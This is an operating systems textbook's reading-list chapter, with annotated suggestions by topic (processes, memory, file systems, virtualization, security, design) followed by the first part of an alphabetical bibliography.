12. Write programs that enter randomly generated short strings into an array and then can search the array for a given string using (a) a simple linear search (brute force), and (b) a more sophisticated method of your choice. Recompile your programs for array sizes ranging from small to as large as you can handle on your system. Evaluate the performance of both approaches. Where is the break-even point?
13. Write a program to simulate an in-memory file system.

## 13

## READING LIST AND BIBLIOGRAPHY

In the previous 12 chapters we have touched upon a variety of topics. This chapter is intended to aid readers interested in pursuing their study of operating systems further. Section 13.1 is a list of suggested readings. Section 13.2 is an alphabetical bibliography of all books and articles cited in this book.

In addition to the references given below, the ACM Symposium on Operating Systems Principles (SOSP) held in odd-numbered years and the USENIX Symposium on Operating Systems Design and Implementation (OSDI) held in even numbered years are good sources for ongoing work on operating systems. The Eurosys Conference, held annually is also a source of top-flight papers. Furthermore, the journals ACM Transactions on Computer Systems and ACM SIGOPS Operating Systems Review, often have relevant articles. Many other ACM, IEEE, and USENIX conferences deal with specialized topics.

### 13.1 SUGGESTIONS FOR FURTHER READING

In this section, we give some suggestions for further reading. Unlike the papers cited in the sections entitled “RESEARCH ON …” in the text, which are about current research, these references are mostly introductory or tutorial in nature. They can, however, serve to present material in this book from a different perspective or with a different emphasis.

### 13.1.1 Introduction

Silberschatz et al., Operating System Concepts, 9th ed.,
A general textbook on operating systems. It covers processes, memory management, storage management, protection and security, distributed systems, and some special-purpose systems. Two case studies are given: Linux and Windows 7. The cover is full of dinosaurs. These are legacy animals, to empahsize that operating systems also carry a lot of legacy.

Stallings, Operating Systems, 7th ed.,
Still another textbook on operating systems. It covers all the traditional topics, and also includes a small amount of material on distributed systems.

Stevens and Rago, Advanced Programming in the UNIX Environment
This book tells how to write C programs that use the UNIX system call interface and the standard C library. Examples are based on the System V Release 4 and the 4.4BSD versions of UNIX. The relationship of these implementations to POSIX is described in detail.

Tanenbaum and Woodhull, Operating Systems Design and Implementation
A hands-on way to learn about operating systems. This book discusses the usual principles, but in addition discusses an actual operating system, MINIX 3, in great detail, and contains a listing of that system as an appendix.

### 13.1.2 Processes and Threads

Arpaci-Dusseau and Arpaci-Dusseau, Operating Systems: Three Easy Pieces
The entire first part of this book is dedicated to virtualization of the CPU to share it with multiple processes. What is nice about this book (besides the fact that there is a free online version), is that it introduces not only the concepts of processing and scheduling techniques, but also the APIs and systems calls like fork and exec in some detail.

Andrews and Schneider, “Concepts and Notations for Concurrent Programming”
A tutorial and survey of processes and interprocess communication, including busy waiting, semaphores, monitors, message passing, and other techniques. The article also shows how these concepts are embedded in various programming languages. The article is old, but it has stood the test of time very well.

Ben-Ari, Principles of Concurrent Programming
This little book is entirely devoted to the problems of interprocess communication. There are chapters on mutual exclusion, semaphores, monitors, and the dining philosophers problem, among others. It, too, has stood up very well over the years.

Zhuravlev et al., “Survey of Scheduling Techniques for Addressing Shared Resources in Multicore Processors”

Multicore systems have started to dominate the field of general-purpose computing world. One of the most important challenges is shared resource contention. In this survey, the authors present different scheduling techniques for handling such contention.

Silberschatz et al., Operating System Concepts, 9th ed.,
Chapters 3 through 6 cover processes and interprocess communication, including scheduling, critical sections, semaphores, monitors, and classical interprocess communication problems.

Stratton et al., “Algorithm and Data Optimization Techniques for Scaling to Massively Threaded Systems”

Programming a system with half a dozen threads is hard enough. But what happens when you have thousands of them? To say it gets tricky is to put it mildly. This article talks about approaches that are being taken.

### 13.1.3 Memory Management

Denning, “Virtual Memory”
A classic paper on many aspects of virtual memory. Peter Denning was one of the pioneers in this field, and was the inventor of the working-set concept.

Denning, “Working Sets Past and Present”
A good overview of numerous memory management and paging algorithms. A comprehensive bibliography is included. Although many of the papers are old, the principles really have not changed at all.

Knuth, The Art of Computer Programming, Vol. 1
First fit, best fit, and other memory management algorithms are discussed and compared in this book.

Arpaci-Dusseau and Arpaci-Dusseaum “Operating Systems: Three Easy Pieces”
This book has a rich section on virtual memory in Chapters 12 to 23 and includes a nice overview of page replacement policies.

### 13.1.4 File Systems

McKusick et al., “A Fast File System for UNIX”
The UNIX file system was completely redone for 4.2 BSD. This paper describes the design of the new file system, with emphasis on its performance.

Silberschatz et al., Operating System Concepts, 9th ed.,
Chapters 10-12 are about storage hardware and file systems. They cover file operations, interfaces, access methods, directories, and implementation, among other topics.

Stallings, Operating Systems, 7th ed.,
Chapter 12 contains a fair amount of material about file systems and little bit about their security.

Cornwell, “Anatomy of a Solid-state Drive”
If you are interested in solid state drives, Michael Cornwell’s introduction is a good starting point. In particular, the author succinctly describes the way in way traditional hard drives and SSDs differ.

### 13.1.5 Input/Output

Geist and Daniel, “A Continuum of Disk Scheduling Algorithms”
A generalized disk-arm scheduling algorithm is presented. Extensive simulation and experimental results are given.

Scheible, “A Survey of Storage Options”
There are many ways to store bits these days: DRAM, SRAM, SDRAM, flash memory, hard disk, floppy disk, CD-ROM, DVD, and tape, to name a few. In this article, the various technologies are surveyed and their strengths and weaknesses highlighted.

Stan and Skadron, “Power-Aware Computing”
Until someone manages to get Moore’s Law to apply to batteries, energy usage is going to continue to be a major issue in mobile devices. Power and heat are so critical these days that operating systems are aware of the CPU temperature and adapt their behavior to it. This article surveys some of the issues and serves as an introduction to five other articles in this special issue of Computer on power-aware computing.

Swanson and Caulfield, “Refactor, Reduce, Recycle: Restructuring the I/O Stack for the Future of Storage”

Disks exist for two reasons: when power is turned off, RAM loses its contents. Also, disks are very big. But suppose RAM did not lose its contents when powered off? How would that change the I/O stack? Nonvolatile memory is here and this article looks at how it changes systems.

Ion, “From Touch Displays to the Surface: A Brief History of Touchscreen Technology,”

Touch screens have become ubiquitous in a short time span. This article traces the history of the touch screen through history with easy-to-understand explanations and nice vintage pictures and videos. Fascinating stuff!

Walker and Cragon, “Interrupt Processing in Concurrent Processors”
Implementing precise interrupts on superscalar computers is a challenging activity. The trick is to serialize the state and do it quickly. A number of the design issues and trade-offs are discussed here.

### 13.1.6 Deadlocks

Coffman et al., “System Deadlocks”
A short introduction to deadlocks, what causes them, and how they can be prevented or detected.

Holt, “Some Deadlock Properties of Computer Systems”
A discussion of deadlocks. Holt introduces a directed graph model that can be used to analyze some deadlock situations.

Isloor and Marsland, “The Deadlock Problem: An Overview”
A tutorial on deadlocks, with special emphasis on database systems. A variety of models and algorithms are covered.

Levine, “Defining Deadlock”
In Chap. 6 of this book, we focused on resource deadlocks and barely touched on other kinds. This short paper points out that in the literature, various definitions have been used, differing in subtle ways. The author then looks at communication, scheduling, and interleaved deadlocks and comes up with a new model that tries to cover all of them.

Shub, “A Unified Treatment of Deadlock”
This short tutorial summarizes the causes and solutions to deadlocks and suggests what to emphasize when teaching it to students.

### 13.1.7 Virtualization and the Cloud

Portnoy, “Virtualization Essentials”
A gentle introduction to virtualization. It covers the context (including the relation between virtualization and the cloud), and covers a variety of solutions (with a bit more emphasis on VMware).

Erl et al., Cloud Computing: Concepts, Technology & Architecture
A book devoted to cloud computing in a broad sense. The authors explain in
detail what is hidden behind acronyms like IAAS, PAAS, SAAS, and similar “X” As A Service family members.

Rosenblum and Garfinkel, “Virtual Machine Monitors: Current Technology and Future Trends”

Starting with a history of virtual machine monitors, this article then goes on to discuss the current state of CPU, memory, and I/O virtualization. In particular, it covers problem areas relating to all three and how future hardware may alleviate the problems.

Whitaker et al., “Rethinking the Design of Virtual Machine Monitors”
Most computers have some bizarre and difficult to virtualize aspects. In this paper, the authors of the Denali system argue for paravirtualization, that is, changing the guest operating systems to avoid using the bizarre features so that they need not be emulated.

### 13.1.8 Multiple Processor Systems

Ahmad, “Gigantic Clusters: Where Are They and What Are They Doing?”
To get an idea of the state-of-the-art in large multicomputers, this is a good place to look. It describes the idea and gives an overview of some of the larger systems currently in operation. Given the working of Moore’s law, it is a reasonable bet that the sizes mentioned here will double about every two years or so.

Dubois et al., “Synchronization, Coherence, and Event Ordering in Multiprocessors”

A tutorial on synchronization in shared-memory multiprocessor systems. However, some of the ideas are equally applicable to single-processor and distributed memory systems as well.

Geer, “For Programmers, Multicore Chips Mean Multiple Challenges”
Multicore chips are happening-whether the software folks are ready or not. As it turns out, they are not ready, and programming these chips offers many challenges, from getting the right tools, to dividing up the work into little pieces, to testing the results.

Kant and Mohapatra, “Internet Data Centers”
Internet data centers are massive multicomputers on steroids. They often contain tens or hundreds of thousands of computers working on a single application. Scalability, maintenance, and energy use are major issues here. This article forms an introduction to the subject and introduces four additional articles on the subject.

Kumar et al., “Heterogeneous Chip Multiprocessors”
The multicore chips used for desktop computers are symmetric-all the cores are identical. However, for some applications, heterogeneous CMPs are widespread, with cores for computing, video decoding, audio decoding, and so on. This paper discusses some issues related to heterogeneous CMPs.

Kwok and Ahmad, “Static Scheduling Algorithms for Allocating Directed Task Graphs to Multiprocessors”

Optimal job scheduling of a multicomputer or multiprocessor is possible when the characteristics of all the jobs are known in advance. The problem is that optimal scheduling takes too long to compute. In this paper, the authors discuss and compare 27 known algorithms for attacking this problem in different ways.

Zhuravlev et al., “Survey of Scheduling Techniques for Addressing Shared Resources in Multicore Processors”

As mentioned earlier, one of the most important challenges in multiprocessor systems is shared resource contention. This survey presents different scheduling techniques for handling such contention.

### 13.1.9 Security

Anderson, Security Engineering, 2nd Edition
A wonderful book that explains very clearly how to build dependable and secure systems by one of the best-known researchers in the field. Not only is this a fascinating look at many aspects of security (including techniques, applications, and organizational issues), it is also freely available online. No excuse for not reading it.

Van der Veen et al., “Memory Errors: the Past, the Present, and the Future”
A historical view on memory errors (including buffer overflows, format string attacks, dangling pointers, and many others) that includes attacks and defenses, attacks that evade those defenses, new defenses that stop the attacks that evaded the earlier defenses, and …, well, anyway, you get the idea. The authors show that despite their old age and the rise of other types of attack, memory errors remain an extremely important attack vector. Moreover, they argue that this situation is not likely to change any time soon.

Bratus, “What Hackers Learn That the Rest of Us Don’t”
What makes hackers different? What do they care about that regular programmers do not? Do they have different attitudes toward APIs? Are corner cases important? Curious? Read it.

Bratus et al., “From Buffer Overflows to Weird Machines and Theory of Computation”

Connecting the humble buffer overflow to Alan Turing. The authors show that hackers program vulnerable programs like weird machines with strange-looking instruction sets. In doing so, they come full circle to Turing’s seminal research on “What is computable?”

## Denning, Information Warfare and Security

Information has become a weapon of war, both military and corporate. The participants try not only to attack the other side’s information systems, but to safeguard their own, too. In this fascinating book, the author covers every conceivable topic relating to offensive and defensive strategy, from data diddling to packet sniffers. A must read for anyone seriously interested in computer security.

## Ford and Allen, “How Not to Be Seen”

Viruses, spyware, rootkits, and digital rights management systems all have a great interest in hiding things. This article provides a brief introduction to stealth in its various forms.

## Hafner and Markoff, Cyberpunk

Three compelling tales of young hackers breaking into computers around the world are told here by the New York Times computer reporter who broke the Internet worm story (Markoff).

## Johnson and Jajodia, “Exploring Steganography: Seeing the Unseen”

Steganography has a long history, going back to the days when the writer would shave the head of a messenger, tattoo a message on the shaved head, and send him off after the hair grew back. Although current techniques are often hairy, they are also digital and have lower latency. For a thorough introduction to the subject as currently practiced, this paper is the place to start.

## Ludwig, “The Little Black Book of Email Viruses”

If you want to write antivirus software and need to understand how viruses work down to the bit level, this is the book for you. Every kind of virus is discussed at length and actual code for many of them is supplied as well. A thorough knowledge of programming the x86 in assembly language is a must, however.

## Mead, “Who is Liable for Insecure Systems?”

Although most work on computer security approaches it from a technical perspective, that is not the only one. Suppose software vendors were legally liable for the damages caused by their faulty software. Chances are security would get a lot more attention from vendors than it does now? Intrigued by this idea? Read this article.

Milojicic, “Security and Privacy”
Security has many facets, including operating systems, networks, implications for privacy, and more. In this article, six security experts are interviewed on their thoughts on the subject.

Nachenberg, “Computer Virus-Antivirus Coevolution”
As soon as the antivirus developers find a way to detect and neutralize some class of computer virus, the virus writers go them one better and improve the virus. The cat-and-mouse game played by the virus and antivirus sides is discussed here. The author is not optimistic about the antivirus writers winning the war, which is bad news for computer users.

Sasse, “Red-Eye Blink, Bendy Shuffle, and the Yuck Factor: A User Experience of Biometric Airport Systems”

The author discusses his experiences with the iris recognition system used at a number of large airports. Not all of them are positive.

Thibadeau, “Trusted Computing for Disk Drives and Other Peripherals”
If you thought a disk drive was just a place where bits are stored, think again. A modern disk drive has a powerful CPU, megabytes of RAM, multiple communication channels, and even its own boot ROM. In short, it is a complete computer system ripe for attack and in need of its own protection system. This paper discusses securing the disk drive.

### 13.1.10 Case Study 1: UNIX, Linux, and Android

Bovet and Cesati, Understanding the Linux Kernel
This book is probably the best overall discussion of the Linux kernel. It covers processes, memory management, file systems, signals, and much more.

IEEE, “Information Technology-Portable Operating System Interface (POSIX), Part 1: System Application Program Interface (API) [C Language]”

This is the standard. Some parts are actually quite readable, especially Annex B, “Rationale and Notes,” which often sheds light on why things are done as they are. One advantage of referring to the standards document is that, by definition, there are no errors. If a typographical error in a macro name makes it through the editing process it is no longer an error, it is official.

Fusco, The Linux Programmer’s Toolbox
This book describes how to use Linux for the intermediate user, one who knows the basics and wants to start exploring how the many Linux programs work. It is intended for C programmers.

Maxwell, Linux Core Kernel Commentary
The first 400 pages of this book contain a subset of the Linux kernel code. The last 150 pages consist of comments on the code, very much in the style of John Lions’ classic book. If you want to understand the Linux kernel in all its gory detail, this is the place to begin, but be warned: reading 40,000 lines of C is not for everyone.

### 13.1.11 Case Study 2: Windows 8

Cusumano and Selby, “How Microsoft Builds Software”
Have you ever wondered how anyone could write a 29 -million-line program (like Windows 2000) and have it work at all? To find out how Microsoft’s build-and-test cycle is used to manage very large software projects, take a look at this paper. The procedure is quite instructive.

Rector and Newcomer, Win32 Programming
If you are looking for one of those 1500-page books giving a summary of how to write Windows programs, this is not a bad start. It covers windows, devices, graphical output, keyboard and mouse input, printing, memory management, libraries, and synchronization, among many other topics. It requires knowledge of C or C++.

Russinovich and Solomon, Windows Internals, Part 1
If you want to learn how to use Windows, there are hundreds of books out there. If you want to know how Windows works inside, this is your best bet. It covers numerous internal algorithms and data structures, and in considerable technical detail. No other book comes close.

### 13.1.12 Operating System Design

Saltzer and Kaashoek, Principles of Computer System Design: An Introduction
This books looks at computer systems in general, rather than operating systems per se, but the principles they identify apply very much to operating systems also. What is interesting about this work is that it carefully identifies “the ideas that worked,” such as names, file systems, read-write coherence, authenticated and confidential messages, etc. Principles that, in our opinion, all computer scientists in the world should recite every day, before going to work.

Brooks, The Mythical Man Month: Essays on Software Engineering
Fred Brooks was one of the designers of IBM’s OS/360. He learned the hard way what works and what does not work. The advice given in this witty, amusing, and informative book is as valid now as it was a quarter of a century ago when he first wrote it down.

Cooke et al., “UNIX and Beyond: An Interview with Ken Thompson”
Designing an operating system is much more of an art than a science. Consequently, listening to experts in the field is a good way to learn about the subject. They do not come much more expert than Ken Thompson, co-designer of UNIX, Inferno, and Plan 9. In this wide-ranging interview, Thompson gives his thoughts on where we came from and where we are going in the field.

Corbató, “On Building Systems That Will Fail”
In his Turing Award lecture, the father of timesharing addresses many of the same concerns that Brooks does in The Mythical Man-Month. His conclusion is that all complex systems will ultimately fail, and that to have any chance for success at all, it is absolutely essential to avoid complexity and strive for simplicity and elegance in design.

Crowley, Operating Systems: A Design-Oriented Approach
Most textbooks on operating systems just describe the basic concepts (processes, virtual memory, etc.) and give a few examples, but say nothing about how to design an operating system. This one is unique in devoting four chapters to the subject.

Lampson, “Hints for Computer System Design”
Butler Lampson, one of the world’s leading designers of innovative operating systems, has collected many hints, suggestions, and guidelines from his years of experience and put them together in this entertaining and informative article. Like Brooks’ book, this is required reading for every aspiring operating system designer.

Wirth, “A Plea for Lean Software”
Niklaus Wirth, a famous and experienced system designer, makes the case here for lean and mean software based on a few simple concepts, instead of the bloated mess that much commercial software is. He makes his point by discussing his Oberon system, a network-oriented, GUI-based operating system that fits in 200 KB, including the Oberon compiler and text editor.

### 13.2 ALPHABETICAL BIBLIOGRAPHY

ABDEL-HAMID, T., and MADNICK, S.: Software Project Dynamics: An Integrated Approach, Upper Saddle River, NJ: Prentice Hall, 1991.

ACCETTA, M., BARON, R., GOLUB, D., RASHID, R., TEVANIAN, A., and YOUNG, M.: “Mach: A New Kernel Foundation for UNIX Development,” Proc. USENIX Summer Conf., USENIX, pp. 93-112, 1986.

ADAMS, G.B. III, AGRAWAL, D.P., and SIEGEL, H.J.: “A Survey and Comparison of Fault-Tolerant Multistage Interconnection Networks,” Computer, vol. 20, pp. 14-27, June 1987.

ADAMS, K., and AGESEN, O.: “A Comparison of Software and Hardware Technqiues for X86 Virtualization,” Proc. 12th Int’l Conf. on Arch. Support for Prog. Lang. and Operating Systems, ACM, pp. 2-13, 2006.

AGESEN, O., MATTSON, J., RUGINA, R., and SHELDON, J.: “Software Techniques for Avoiding Hardware Virtualization Exits,” Proc. USENIX Ann. Tech. Conf., USENIX, 2012.

AHMAD, I.: “Gigantic Clusters: Where Are They and What Are They Doing?” IEEE Concurrency, vol. 8, pp. 83-85, April-June 2000.

AHN, B.-S., SOHN, S.-H., KIM, S.-Y., CHA, G.-I., BAEK, Y.-C., JUNG, S.-I., and KIM, M.-J.: “Implementation and Evaluation of EXT3NS Multimedia File System,” Proc. 12th Ann. Int’l Conf. on Multimedia, ACM, pp. 588-595, 2004.

ALBATH, J., THAKUR, M., and MADRIA, S.: “Energy Constraint Clustering Algorithms for Wireless Sensor Networks,” J. Ad Hoc Networks, vol. 11, pp. 2512-2525, Nov. 2013.

AMSDEN, Z., ARAI, D., HECHT, D., HOLLER, A., and SUBRAHMANYAM, P.: “VMI: An Interface for Paravirtualization,” Proc. 2006 Linux Symp., 2006.

ANDERSON, D.: SATA Storage Technology: Serial ATA, Mindshare, 2007.
ANDERSON, R.: Security Engineering, 2nd ed., Hoboken, NJ: John Wiley & Sons, 2008.
ANDERSON, T.E.: “The Performance of Spin Lock Alternatives for Shared-Memory Multiprocessors,” IEEE Trans. on Parallel and Distr. Systems, vol. 1, pp. 6-16, Jan. 1990.

ANDERSON, T.E., BERSHAD, B.N., LAZOWSKA, E.D., and LEVY, H.M.: “Scheduler Activations: Effective Kernel Support for the User-Level Management of Parallelism,” ACM Trans. on Computer Systems, vol. 10, pp. 53-79, Feb. 1992.

ANDREWS, G.R.: Concurrent Programming - Principles and Practice, Redwood City, CA: Benjamin/Cummings, 1991.

ANDREWS, G.R., and SCHNEIDER, F.B.: “Concepts and Notations for Concurrent Programming,” Computing Surveys, vol. 15, pp. 3-43, March 1983.

APPUSWAMY, R., VAN MOOLENBROEK, D.C., and TANENBAUM, A.S.: “Flexible, Modular File Volume Virtualization in Loris,” Proc. 27th Symp. on Mass Storage Systems and Tech., IEEE, pp. 1-14, 2011.

ARNAB, A., and HUTCHISON, A.: “Piracy and Content Protection in the Broadband Age,” Proc. S. African Telecomm. Netw. and Appl. Conf, 2006.

ARON, M., and DRUSCHEL, P.: “Soft Timers: Efficient Microsecond Software Timer Support for Network Processing,” Proc. 17th Symp. on Operating Systems Principles, ACM, pp. 223-246, 1999.

ARPACI-DUSSEAU, R. and ARPACI-DUSSEAU, A.: Operating Systems: Three Easy Pieces, Madison, WI: Arpacci-Dusseau, 2013.

BAKER, F.T.: “Chief Programmer Team Management of Production Programming,” IBM Systems J., vol. 11, pp. 1, 1972.

BAKER, M., SHAH, M., ROSENTHAL, D.S.H., ROUSSOPOULOS, M., MANIATIS, P., GIULI, TJ., and BUNGALE, P.: “A Fresh Look at the Reliability of Long-Term Digital Storage,” Proc. First European Conf. on Computer Systems (EUROSYS), ACM, pp. 221-234, 2006.

BALA, K., KAASHOEK, M.F., and WEIHL, W.: “Software Prefetching and Caching for Translation Lookaside Buffers,” Proc. First Symp. on Operating Systems Design and Implementation, USENIX, pp. 243-254, 1994.

BARHAM, P., DRAGOVIC, B., FRASER, K., HAND, S., HARRIS, T., HO, A., NEUGE-BAUER, R., PRATT, I., and WARFIELD, A.: “Xen and the Art of Virtualization,” Proc. 19th Symp. on Operating Systems Principles, ACM, pp. 164-177, 2003.

BARNI, M.: “Processing Encrypted Signals: A New Frontier for Multimedia Security,” Proc. Eighth Workshop on Multimedia and Security, ACM, pp. 1-10, 2006.

BARR, K., BUNGALE, P., DEASY, S., GYURIS, V., HUNG, P., NEWELL, C., TUCH, H., and ZOPPIS, B.: “The VMware Mobile Virtualization Platform: Is That a Hypervisor in Your Pocket?” ACM SIGOPS Operating Systems Rev., vol. 44, pp. 124-135, Dec. 2010.

BARWINSKI, M., IRVINE, C., and LEVIN, T.: “Empirical Study of Drive-By-Download Spyware,” Proc. Int’l Conf. on I-Warfare and Security, Academic Confs. Int’l, 2006.

BASILLI, V.R., and PERRICONE, B.T.: “Software Errors and Complexity: An Empirical Study,” Commun. of the ACM, vol. 27, pp. 42-52, Jan. 1984.

BAUMANN, A., BARHAM, P., DAGAND, P., HARRIS, T., ISAACS, R., PETER, S., ROSCOE, T., SCHUPBACH, A., and SINGHANIA, A.: “The Multikernel: A New OS Architecture for Scalable Multicore Systems,” Proc. 22nd Symp. on Operating Systems Principles, ACM, pp. 29-44, 2009.

BAYS, C.: “A Comparison of Next-Fit, First-Fit, and Best-Fit,” Commun. of the ACM, vol. 20, pp. 191-192, March 1977.

BEHAM, M., VLAD, M., and REISER, H.: “Intrusion Detection and Honeypots in Nested Virtualization Environments,” Proc. 43rd Conf. on Dependable Systems and Networks, IEEE, pp. 1-6, 2013.

BELAY, A., BITTAU, A., MASHTIZADEH, A., TEREI, D., MAZIERES, D., and KOZYRAKIS, C.: “Dune: Safe User-level Access to Privileged CPU Features,” Proc. Ninth Symp. on Operating Systems Design and Implementation, USENIX, pp. 335-348, 2010.

BELL, D., and LA PADULA, L.: “Secure Computer Systems: Mathematical Foundations and Model,” Technical Report MTR 2547 v2, Mitre Corp., Nov. 1973.

BEN-ARI, M.: Principles of Concurrent and Distributed Programming, Upper Saddle River, NJ: Prentice Hall, 2006.

BEN-YEHUDA, M., D. DAY, M., DUBITZKY, Z., FACTOR, M., HAR’EL, N., GORDON, A., LIGUORI, A., WASSERMAN, O., and YASSOUR, B.: “The Turtles Project: Design and Implementation of Nested Virtualization,” Proc. Ninth Symp. on Operating Systems Design and Implementation, USENIX, Art. 1-6, 2010.

BHEDA, R.A., BEU, J.G., RAILING, B.P., and CONTE, T.M.: “Extrapolation Pitfalls When Evaluating Limited Endurance Memory,” Proc. 20th Int’l Symp. on Modeling, Analysis, & Simulation of Computer and Telecomm. Systems, IEEE, pp. 261-268, 2012.

BHEDA, R.A., POOVEY, J.A., BEU, J.G., and CONTE, T.M.: “Energy Efficient Phase Change Memory Based Main Memory for Future High Performance Systems,” Proc. Int’l Green Computing Conf., IEEE, pp. 1-8, 2011.

BHOEDJANG, R.A.F., RUHL, T., and BAL, H.E.: “User-Level Network Interface Protocols,” Computer, vol. 31, pp. 53-60, Nov. 1998.

BIBA, K.: “Integrity Considerations for Secure Computer Systems,” Technical Report 76-371, U.S. Air Force Electronic Systems Division, 1977.

BIRRELL, A.D., and NELSON, B.J.: “Implementing Remote Procedure Calls,” ACM Trans. on Computer Systems, vol. 2, pp. 39-59, Feb. 1984.

BISHOP, M., and FRINCKE, D.A.: “Who Owns Your Computer?” IEEE Security and Privacy, vol. 4, pp. 61-63, 2006.

BLACKHAM, B, SHI, Y. and HEISER, G.: “Improving Interrupt Response Time in a Verifiable Protected Microkernel,” Proc. Seventh European Conf. on Computer Systems (EUROSYS), April, 2012.

BOEHM, B.: Software Engineering Economics, Upper Saddle River, NJ: Prentice Hall, 1981.

BOGDANOV, A., AND LEE, C.H.: “Limits of Provable Security for Homomorphic Encryption,” Proc. 33rd Int’l Cryptology Conf., Springer, 2013.

BORN, G: Inside the Windows 98 Registry, Redmond, WA: Microsoft Press, 1998.
BOTELHO, F.C., SHILANE, P., GARG, N., and HSU, W.: “Memory Efficient Sanitization of a Deduplicated Storage System,” Proc. 11th USENIX Conf. on File and Storage Tech., USENIX, pp. 81-94, 2013.

BOTERO, J. F., and HESSELBACH, X.: “Greener Networking in a Network Virtualization Environment,” Computer Networks, vol. 57, pp. 2021-2039, June 2013.

BOULGOURIS, N.V., PLATANIOTIS, K.N., and MICHELI-TZANAKOU, E.: Biometics : Theory Methods, and Applications, Hoboken, NJ: John Wiley & Sons, 2010.

BOVET, D.P., and CESATI, M.: Understanding the Linux Kernel, Sebastopol, CA: O’Reilly & Associates, 2005.

BOYD-WICKIZER, S., CHEN, H., CHEN, R., MAO, Y., KAASHOEK, F., MORRIS, R., PESTEREV, A., STEIN, L., WU, M., DAI, Y., ZHANG, Y., and ZHANG, Z.: “Corey: an Operating System for Many Cores,” Proc. Eighth Symp. on Operating Systems Design and Implementation, USENIX, pp. 43-57, 2008.

BOYD-WICKIZER, S., CLEMENTS A.T., MAO, Y., PESTEREV, A., KAASHOEK, F.M., MORRIS, R., and ZELDOVICH, N.: “An Analysis of Linux Scalability to Many Cores,” Proc. Ninth Symp. on Operating Systems Design and Implementation, USENIX, 2010.

BRATUS, S.: “What Hackers Learn That the Rest of Us Don’t: Notes on Hacker Curriculum,” IEEE Security and Privacy, vol. 5, pp. 72-75, July/Aug. 2007.

BRATUS, S., LOCASTO, M.E., PATTERSON, M., SASSAMAN, L., SHUBINA, A.: “From Buffer Overflows to Weird Machines and Theory of Computation,” ;Login:, USENIX, pp. 11-21, December 2011.

BRINCH HANSEN, P.: “The Programming Language Concurrent Pascal,” IEEE Trans. on Software Engineering, vol. SE-1, pp. 199-207, June 1975.

BROOKS, F.P., Jr.: “No Silver Bullet-Essence and Accident in Software Engineering,” Computer, vol. 20, pp. 10-19, April 1987.

BROOKS, F.P., Jr.: The Mythical Man-Month: Essays on Software Engineering, 20th Anniversary Edition, Boston: Addison-Wesley, 1995.

BRUSCHI, D., MARTIGNONI, L., and MONGA, M.: “Code Normalization for Self-Mutating Malware,” IEEE Security and Privacy, vol. 5, pp. 46-54, March/April 2007.

BUGNION, E., DEVINE, S., GOVIL, K., and ROSENBLUM, M.: “Disco: Running Commodity Operating Systems on Scalable Multiprocessors,” ACM Trans. on Computer Systems, vol. 15, pp. 412-447, Nov. 1997.

BUGNION, E., DEVINE, S., ROSENBLUM, M., SUGERMAN, J., and WANG, E.: “Bringing Virtualization to the x86 Architecture with the Original VMware Workstation,” ACM Trans. on Computer Systems, vol. 30, number 4, pp.12:1-12:51, Nov. 2012.

BULPIN, J.R., and PRATT, I.A.: “Hyperthreading-Aware Process Scheduling Heuristics,” Proc. USENIX Ann. Tech. Conf., USENIX, pp. 399-403, 2005.

CAI, J., and STRAZDINS, P.E.: “An Accurate Prefetch Technique for Dynamic Paging Behaviour for Software Distributed Shared Memory,” Proc. 41st Int’l Conf. on Parallel Processing, IEEE., pp. 209-218, 2012.

CAI, Y., and CHAN, W.K.: “MagicFuzzer: Scalable Deadlock Detection for Large-scale Applications,” Proc. 2012 Int’l Conf. on Software Engineering, IEEE, pp. 606-616, 2012.

CAMPISI, P.: Security and Privacy in Biometrics, New York: Springer, 2013.
CARPENTER, M., LISTON, T., and SKOUDIS, E.: “Hiding Virtualization from Attackers and Malware,” IEEE Security and Privacy, vol. 5, pp. 62-65, May/June 2007.

CARR, R.W., and HENNESSY, J.L.: “WSClock-A Simple and Effective Algorithm for Virtual Memory Management,” Proc. Eighth Symp. on Operating Systems Principles, ACM, pp. 87-95, 1981.

CARRIERO, N., and GELERNTER, D.: “The S/Net’s Linda Kernel,” ACM Trans. on Computer Systems, vol. 4, pp. 110-129, May 1986.

CARRIERO, N., and GELERNTER, D.: “Linda in Context,” Commun. of the ACM, vol. 32, pp. 444-458, April 1989.

CERF, C., and NAVASKY, V.: The Experts Speak, New York: Random House, 1984.
CHEN, M.-S., YANG, B.-Y., and CHENG, C.-M.: “RAIDq: A Software-Friendly, Multiple-Parity RAID,” Proc. Fifth Workshop on Hot Topics in File and Storage Systems, USENIX, 2013.

CHEN, Z., XIAO, N., and LIU, F.: “SAC: Rethinking the Cache Replacement Policy for SSD-Based Storage Systems,” Proc. Fifth Int’l Systems and Storage Conf., ACM, Art. 13, 2012.

CHERVENAK, A., VELLANKI, V., and KURMAS, Z.: “Protecting File Systems: A Survey of Backup Techniques,” Proc. 15th IEEE Symp. on Mass Storage Systems, IEEE, 1998.

CHIDAMBARAM, V., PILLAI, T.S., ARPACI-DUSSEAU, A.C., and ARPACI-DUSSEAU, R.H.: “Optimistic Crash Consistency,” Proc. 24th Symp. on Operating System Principles, ACM, pp. 228-243, 2013.

CHOI, S., and JUNG, S.: “A Locality-Aware Home Migration for Software Distributed Shared Memory,” Proc. 2013 Conf. on Research in Adaptive and Convergent Systems, ACM, pp. 79-81, 2013.

CHOW, T.C.K., and ABRAHAM, J.A.: “Load Balancing in Distributed Systems,” IEEE Trans. on Software Engineering, vol. SE-8, pp. 401-412, July 1982.

CLEMENTS, A.T, KAASHOEK, M.F., ZELDOVICH, N., MORRIS, R.T., and KOHLER, E.: “The Scalable Commutativity Rule: Designing Scalable Software for Multicore Processors,” Proc. 24th Symp. on Operating Systems Principles, ACM, pp. 1-17, 2013.

COFFMAN, E.G., ELPHICK, M.J., and SHOSHANI, A.: “System Deadlocks,” Computing Surveys, vol. 3, pp. 67-78, June 1971.

COLP, P., NANAVATI, M., ZHU, J., AIELLO, W., COKER, G., DEEGAN, T., LOSCOCCO, P., and WARFIELD, A.: “Breaking Up Is Hard to Do: Security and Functionality in a Commodity Hypervisor,” Proc. 23rd Symp. of Operating Systems Principles, ACM, pp. 189-202, 2011.

COOKE, D., URBAN, J., and HAMILTON, S.: “UNIX and Beyond: An Interview with Ken Thompson,” Computer, vol. 32, pp. 58-64, May 1999.

COOPERSTEIN, J.: Writing Linux Device Drivers: A Guide with Exercises, Seattle: CreateSpace, 2009.

CORBATO, F.J.: “On Building Systems That Will Fail,” Commun. of the ACM, vol. 34, pp. 72-81, June 1991.

CORBATO, F.J., MERWIN-DAGGETT, M., and DALEY, R.C.: “An Experimental Time-Sharing System,” Proc. AFIPS Fall Joint Computer Conf., AFIPS, pp. 335-344, 1962.
